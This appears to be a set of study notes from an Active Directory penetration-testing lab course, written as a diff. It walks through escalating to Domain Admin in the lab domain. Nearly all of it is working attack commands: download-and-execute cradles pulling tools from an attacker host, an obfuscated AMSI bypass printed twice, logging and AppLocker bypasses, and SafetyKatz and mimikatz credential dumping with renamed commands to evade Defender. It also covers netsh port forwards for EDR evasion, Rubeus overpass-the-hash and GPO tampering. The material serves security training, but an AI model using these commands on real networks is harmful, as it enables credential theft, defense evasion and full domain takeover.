@@ -1,0 +1,164 @@
+- Identify a machine in the target domain where a Domain Admin session is available.
+	- `. C:\AD\Tools\Invoke-SessionHunter.ps1`
+	- `Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname.UserSession.Access`
+	- We can observe that on one of the hosts, `dcorp-mgmt`, `svcadmin` (which is a domain administrator) has an ongoing session.
+	- If `Invoke-SessionHunter` doesn't work for some reason, we can recall that we ran `Find-DomainUserLocation`, which can list sessions if we have local administrative access on a machine.
+- Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci.
+	- We already have a reverse shell as `ciadmin` on `dcorp-ci`, from either the NTLM relaying attack we executed using GPOddity earlier in the course, or by abusing Jenkins.
+	- We want to run PowerView using the remote shell, but before doing so, we have to bypass the enhanced logging we face because of our session being a remote session.
+		- As such, first we will start HFS (HttpFileServer) on the attack machine, under the directory where we have the scripts saved (`C:\AD\Tools`).
+		- Next, we will download and execute a script block logging bypass on the remote shell:
+			- `iex (iwr http://172.16.100.1/sbloggingbypass.txt -UseBasicParsing)`
+		- Following this we will also execute an AMSI bypass, before we actually try to run PowerView in memory.
+			- ```S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )```
+	- Finally executing PowerView in memory:
+		- `iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.1/PowerView.ps1'))`
+		- Once this is complete, we can now use PowerView in the remote session.
+	- Executing the `Find-DomainUserLocation` script from our remote session on `dcorp-ci`, leads to requests being sent as `ciadmin` from `dcorp-ci`, to all the machines in the domain, trying to list sessions there.
+		- To enumerate sessions using `Find-DomainUserLocation`, we need to have local administrative privileges, this is the main difference between `Invoke-SessionHunter` and `Find-DomainUserLocation`.
+		- Since we have admin access as `ciadmin` on `dcorp-ci`, we can use `Find-DomainUserLocation` here.
+		- `Find-DomainUserLocation`
+		- This results in a lot of alerts by `MDI`, because our script here would try to enumerate sessions on `dcorp-dc` by default.
+		- We can observe that on one of the hosts, `dcorp-mgmt`, `svcadmin` (which is a domain administrator) has an ongoing session.
+		- To verify that `ci-admin` has administrative access on `dcorp-mgmt`, we can try to run a command on it using `winrs`.
+			- `winrs -r:dcorp-mgmt cmd /c "set computername && set username"`
+	- Extracting credentials from the `dcorp-mgmt` machine, using `ciadmin`'s administrative access on it:
+		- We will first need to copy over `Loader.exe` on the target `dcorp-mgmt` machine.
+		- Before that, since we are not assuming direct access to `dcorp-mgmt` from the student VM, we will download the `Loader.exe` binary to the `dcorp-ci` machine we have access on, and then transfer it to `dcorp-mgmt`.
+			- We already have a HFS server running on our student VM that we can use to download the file on `dcorp-ci`.
+			- `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
+			- Next, we will just transfer it over to `dcorp-mgmt` using our remote session on `dcorp-ci`, since `ciadmin` also has administrative access over `dcorp-mgmt`.
+			- `echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe`
+		- Next, we may want to run `SafetyKatz` on the `dcorp-mgmt` machine to perform credential extraction.
+			- We can directly run `SafetyKatz` (in memory, since we already transferred over `Loader.exe` to `dcorp-mgmt`) on the `dcorp-mgmt` machine via `ciadmin` on `dcorp-ci`, using `winrs`.
+				- `winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://172.16.100.1/SafetyKatz.exe sekurlsa::Evasive-keys exit`
+				- We studied about `sekurlsa::ekeys` earlier, but since Defender started flagging it, it was renamed to `sekurlsa::Evasive-keys` here instead.
+			- But if we run this, the EDR (Defender) on `dcorp-mgmt` may flag it, since we are downloading an executable from a remote web server.
+				- An EDR evasion technique we can use here is to add a port-forward using netsh (a builtin utility on Windows machines), from to listen on port 8080 on `dcorp-mgmt`, and forward all its traffic to port 80 on our student VM.
+					- `$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"`
+					- Now since a port-forward is in place, we can use the command we used to download and execute `SafetyKatz` earlier, but use a forwarded local port in it instead.
+						- `winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::Evasive-keys exit`
+		- `SafetyKatz`, on successful execution, on `dcorp-mgmt`, will provide us with the credentials for multiple users, including `svcadmin`, who is a domain admin, we may also be able to get clear-text credentials in some cases.
+			- The session attribute in the `SafetyKatz` results for `svcadmin` informs us that the session is `Service from 0`, which means that there is a service on `dcorp-mgmt`, running with the privileges of the `svcadmin` user, which may be why we were able to get clear-text credentials for the `svcadmin` user.
+			- What we need to focus on is the `aes256_hmac` key.
+			- We do not need to use the reverse-shell anymore, since we can use the extracted credentials to have domain admin access directly from our student VM now.
+	- Over Pass The Hash (OPtH) using `Rubeus`
+		- On our student VM, we can now use Rubeus, along with the credentials for `svcadmin` we just extracted.
+			- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<svcadmin's AES hash that we extracted earlier> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
+				- The `asktgt` option means that we want to use Rubeus' `asktgt` module.
+				- The `/opsec` option states that we would like the process to be OPSEC safe, that is, use AES for authentication.
+				- The `/createnetonly` option states that we want to create a logon type 9 process.
+				- The `/show` option means that we would like to interact with the initialised process.
+				- The `/ptt` option means that we want to inject the generated ticket right into the initialised process.
+		-  On the newly created CMD process, running `whoami` would still show our current user and not `svcadmin`, because it is using logon type 9; but new credentials will be issued when we want to interact with a domain object, meaning that we now have Domain Admin privileges and can even access the DC.
+			- `winrs -r:dcorp-dc cmd /c set username`
+			- The command above will return `USERNAME=svcadmin`, showing that we can access the DC using `svcadmin` privileges.
+
+- Escalate privileges to Domain Admin by abusing derivative local admin through `dcorp-adminsrv`. On `dcorp-adminsrv`, tackle application allowlisting using: (1) Gaps in Applocker rules.
+		- Derivative Local Admin
+			- If from the student VM, you have admin access on `dcorp-adminsrv`, and a user `srvadmin` on `dcorp-adminsrv` has admin access on `dcorp-mgmt`, then the initial user we have on student VM also has "derivative" local admin access on `dcorp-mgmt`.
+			- This can be done because we can extract the credentials for the `srvadmin` user using our local administrator access on the `dcorp-adminsrv` machine, and then use that account's local administrator privileges on `dcorp-mgmt`.
+			- Accessing the `srvadmin` user from our foothold student VM, using `winrs` or PS Remoting:
+				- `winrs -r:dcorp-adminsrv cmd`
+				- or `Enter-PSSession dcorp-adminsrv`
+		- Constrained Language Mode Bypass
+			- If we try to use the PS Session we just gained, and run the AMSI bypass we used earlier on it, we will observe a Constrained Language Mode error, we can list the currently implemented language mode using the command `$ExecutionContext.SessionState.LanguageMode`:
+				- ```S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )```
+				- `$ExecutionContext.SessionState.LanguageMode`
+			- In a default local PowerShell session, the language mode is `FullLanguage`.
+			- In the current context it is `ConstrainedLanguage`, this is because either an application allowlisting solution like AppLocker or DeviceGuard is running on a machine, in which case the language mode is generally set to `ConstrainedLanguage`.
+				- In the `ConstrainedLanguage` mode, nothing much of interest to us except the MS AD Module works.
+			- Checking the effective AppLocker Policy and Rule Collections:
+				- `Get-AppLockerPolicy -Effective`
+				- `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
+					- The `PublisherConditions` referring to Microsoft Corporation states the fact that the rule is specified for Microsoft signed binaries.
+					- The SID value `S-1-1-0` states that the rule is applicable to everyone.
+					- The action specifies whether the rule prohibits or allows an action.
+			- Insights on AppLocker:
+				- There are also some default rules for AppLocker, two of which specify that anyone can run any binaries or scripts present in the `ProgramFiles` and `WINDIR`.
+				- These default rules make AppLocker a joke, since we can run any script present in the above-mentioned directories.
+				- Allow-listing is the politically correct word for application white-listing, block-listing is the politically correct word for application black-listing.
+				- Traditional AVs used to be signature based in nature and block-listed execution after referencing hashes with a known-threat database. In place of block-listing known bad code, we can only allow known good code and thus follow application allow-listing, this is the approach followed by AppLocker.
+					- The issue with this approach is that defining known good code in a real-life environment is close to impossible.
+					- If we consider signed code to be trustworthy; whether it be MS-signed, vendor-signed or signed by any entity at all; we can have a look at projects like [LOLBAS (Living Off The Land Binaries, Scripts and Libraries)](https://lolbas-project.github.io/) to disprove our point.
+					- MS itself recommends block-listing a lot of their own binaries, so we cannot consider even MS-signed code to be trustworthy.
+					- Most organisations don't run application allow-listing in block mode, they relegate themselves to run it in audit mode instead so someone who is trying to executing a script is not blocked, but a log for it is generated.
+				- MS has two tools that can perform application allow-listing, AppLocker is the weaker one of the two, WDAC is a much more powerful alternative instead.
+					- AppLocker doesn't protect against an attacker who may have local administrator access on the machine it is implemented on.
+						- One way to incapacitate AppLocker on a machine we have administrative access on is to stop the `AppIDSvc` service, which is used by AppLocker to identify whether an executable is on the allow list or not.
+						- There are a lot more ways to bypass AppLocker with admin privileges, which can be researched online.
+							- A notable security researcher, Oddvar Moe's research on AppLocker can be looked up on his blog post [linked here](https://oddvar.moe/tag/applocker/).
+			- Trying to bypass AppLocker using the default rule for `ProgramFiles`
+				- This is the one and only situation in the course where we are using an obfuscated PowerShell port of `mimikatz` (obfuscated to avoid detection by Defender), `Invoke-Mimi.ps1`.
+				- First of all we will go back to our student VM and copy the `Invoke-Mimi.ps1` script to the `dcorp-adminsrv` machine.
+					- `exit` from the previous PS Remoting session.
+					- `Copy-Item C:\AD\Tools\Invoke-Mimi.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\'Program Files'`
+					- `Enter-PSSession dcorp-adminsrv`
+					- `cd 'C:\Program Files\'`
+					- `ls`
+					- `.\Invoke-Mimi.ps1`
+						- This command fails to work, so we try dot sourcing the script next.
+					- `. .\Invoke-Mimi.ps1`
+						- Dot sourcing the script will result in an error that scripts created in a different language mode cannot be dot sourced, but can be executed directly, which failed for us as well.
+						- But if we look at the `Invoke-Mimi.ps1` script, we will observe that it loads a function `Invoke-Mimi`, after loading which we can call that function and pass a command, however we cannot do that directly.
+							- So we need to include the function call in the script's code itself.
+							- We will first create `Invoke-MimiEx-keys-std1`, in which we add a function call at the end, with the command `securelsa::ekeys`, but obfuscated in a way where each of the character of the command is saved in a variable and then appended in the line where the command needs to be passed.
+						- We now need to copy it to the `dcorp-adminsrv` server and then execute it, like we did with the original `Invoke-Mimi.ps1` script earlier.
+						- After `Invoke-MimiEx-keys-std1.ps1` successfully executes, we will come across credentials for the `svcadmin` user, an `appadmin` user, a `websvc` user, and `DCORP-ADMINSRV$`.
+			- There is one more way of extracting credentials (Extracting credentials from Windows Credential Vault), we should not always keep running after credentials from LSASS.
+				- We can also try to extract credentials from the credential vault.
+					- The credential vault is used to save credentials, for example when we run a scheduled task as a user, or when we save the credentials to login to a RDP session.
+				- Because it is not as popular as `ekeys`, there may not be much need for us to obfuscate the command we add to the `Invoke-Mimi.ps1` script to create the `Invoke-MimiEx-vault-std1.ps1` script from it.
+					- `Invoke-Mimi -Command '"token:elevate" "vault::cred /patch"'`
+				- After creating the `Invoke-MimiEx-vault-std1.ps1` script, we can transfer it to `dcorp-adminsrv` using HFS, and run it.
+					- `.\Invoke-MimiEx-vault-std1.ps1`
+					- This command will show us the credentials saved in the Windows credentials vault.
+					- The command results in the clear-text credentials of the `srvadmin` user, along with the scheduled task associated with the user, because of which the credentials have been saved in the vault.
+					- Vault credentials are equivalent to DPAPI.
+				- `Invoke-MimiEx-vault-std1.ps1` will give us credentials for `srvadmin`, including AES keys as well as clear-text credentials, we can use the AES hash with `Rubeus` to perform an Overpass The Hash attack, or use the plain-text credentials with `runas`.
+					- `runas /user:dcorp\srvadmin /netonly cmd`
+					- In the CMD session that starts, we can first run InviShell to bypass common detection mechanisms.
+						- `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
+					- Finding machines we may have Local Admin access on:
+						- `Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose`
+						- The script's results tell us that we have local admin access on `dcorp-mgmt` and `dcorp-adminsrv`.
+					- We already copied `Loader.exe` to `dcorp-mgmt` in our previous attempt at performing credential extraction from `dcorp-mgmt`, we may still need to copy over `Loader.exe` if it is not present on the `dcorp-mgmt` machine, before we do anything else.
+						- `echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe`
+					- We will again need to add the port-forwarding to avoid network-based detection by the EDR.
+						- `$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"`
+					- Next, we will execute `SafetyKatz` (in memory) to extract credentials from the machine, like we did earlier.
+						- `winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::Evasive-keys exit`
+						- We will again find the credentials (clear-text password, and hashes) for the `svcadmin` user.
+						- We will also find credentials for `websvc`, local admin and `dcorp-adminsrv$` as well.
+				- We cannot use hashes or AES keys with `runas`, for that we have to perform Over Pass the Hash using `Rubeus`.
+
+
+- Escalate privileges to Domain Admin by abusing derivative local admin through `dcorp-adminsrv`. On `dcorp-adminsrv`, tackle application allowlisting using: (2) Disable Applocker by modifying GPO applicable to `dcorp-adminsrv`.
+	- Using BloodHound CE, we are able to analyse the student user's outbound object control:
+		- It is a member of the `RDPUSERS` group.
+		- Among other things, we'll find out that it has `GenericAll` and `GenericWrite`, i.e., full control over the AppLocker policy, we have previously identified that AppLocker is the group policy that applies on `dcorp-adminsrv`.
+	- A common issue that came up while trying to modify the AppLocker group policy is that even though we are already logged in as the student account, we need to start a new process as the student account using `runas` to successfully modify it. If it still fails, we may need to verify our credentials and log in again.
+		- `runas /user:dcorp\student1 /netonly cmd`
+	- Next from within the newly initialised CMD process, we need to run `gpmc.msc`, if it is the first time we are running it, we may need to install it as a windows feature:
+		- `gpmc.msc`
+	- Next, we need to modify the "Applocker" policy, by right-clicking on it in the navigation pane, and selecting "Edit..".
+		- A new window will open up, in which we need to navigate to `Computer Configuration>Policies>Windows Settings>Security Settings>Application Control Policies>AppLocker`.
+			- Under "Executable Rules", one of the rules is that everyone is allowed to execute Microsoft signed binaries.
+			- There are no "Windows Installer Rules".
+			- Under "Script Rules", there is a publisher-based rule, that states that everyone is allowed to run Microsoft signed binaries, and there are two other path-based default rules present, which allow execution of scripts present in the Program Files folder, and the Windows Installation directory.
+			- We will select and delete the only "Executable Rule" present, which states that only Microsoft signed binaries can be executed by everyone.
+	- Now, since we have administrative access to `dcorp-adminsrv`, we can log onto it using winrs or PS Remoting, followed by forcing a group policy update.
+		- `Enter-PSSession dcorp-adminsrv`
+			- `gpupdate /force`
+	- We will copy `Loader.exe` to `dcorp-adminsrv`, from our student VM.
+		- `echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe`
+	- We will now access `dcorp-adminsrv` again, using winrs here, since we are no longer using PS.
+		- `winrs -r:dcorp-adminsrv cmd`
+		- Before we try to download and execute anything here, we need to again create a port forward to prevent the EDR from detecting malicious inbound traffic.
+			- `netsh interface portproxy add v4tov4 listenport=8000 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+		- We will now download and execute `SafetyKatz` in memory, on `dcorp-adminsrv`, using `Loader.exe`.
+			- `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::Evasive-keys" "exit"`
+			- This will also now dump the credentials from the machine, we will come across credentials for the `svcadmin` user, an `appadmin` user, a `websvc` user, and `DCORP-ADMINSRV$`.
+	- We successfully modified the AppLocker policy using our access on it via `RDPUSERS`, to delete an Executable Rule, and enable execution of unsigned binaries.
+	- Would the GPO modification affect all machines?
+		- No, remember that the AppLocker policy applies to a specific OU, which only consists of the `dcorp-adminsrv` machine. However if the OU consisted of more machines, it would affect them as well.
